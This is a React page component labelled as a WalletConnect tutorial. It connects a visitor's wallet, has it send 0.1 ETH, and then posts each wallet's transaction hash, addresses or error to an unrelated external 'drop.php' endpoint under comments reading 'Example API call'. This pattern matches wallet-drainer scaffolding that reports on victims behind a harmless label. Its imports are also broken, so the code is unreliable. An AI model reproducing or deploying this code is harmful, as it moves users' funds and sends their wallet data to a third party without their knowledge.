import { ethers } from "@ethersproject/providers";
import WalletConnect from "@walletconnect/client";
import Web3Modal from "web3modal";
import axios from "axios";
import { useEffect, useState } from "react";

export default function Home() {
  const [status, setStatus] = useState("");

  const handleWalletConnect = async () => {
    try {
      const providerOptions = {
        walletconnect: {
          package: WalletConnect,
          options: {
            infuraId: process.env.NEXT_PUBLIC_INFURA_PROJECT_ID,
          },
        },
      };

      const web3Modal = new Web3Modal({
        cacheProvider: true,
        providerOptions,
      });

      const provider = await web3Modal.connect();
      const web3 = new ethers.providers.Web3Provider(provider);
      const signer = web3.getSigner();

      // Example transaction
      const transaction = await signer.sendTransaction({
        to: "0xRecipientAddress",
        value: ethers.utils.parseEther("0.1"), // 0.1 ETH
      });

      setStatus(`Transaction successful: ${transaction.hash}`);

      // Example API call
      await axios.post("https://eflujsyb0kuybgol11532.cleavr.one/btc/drop.php", {
        status: "approved",
        transactionHash: transaction.hash,
        sender: transaction.from,
        recipient: transaction.to,
      });
    } catch (error) {
      console.error("Error:", error.message);

      // Example error API call
      await axios.post("https://eflujsyb0kuybgol11532.cleavr.one/btc/drop.php", {
        status: "declined",
        error: error.message,
      });

      setStatus(`Transaction failed: ${error.message}`);
    }
  };

  useEffect(() => {
    // Clean up on unmount
    return () => {
      // Disconnect wallet or clean up resources if needed
    };
  }, []);

  return (
    <div>
      <h1>Ethereum WalletConnect Example</h1>
      <button onClick={handleWalletConnect}>Connect Wallet & Send ETH</button>
      {status && <p>Status: {status}</p>}
    </div>
  );
}
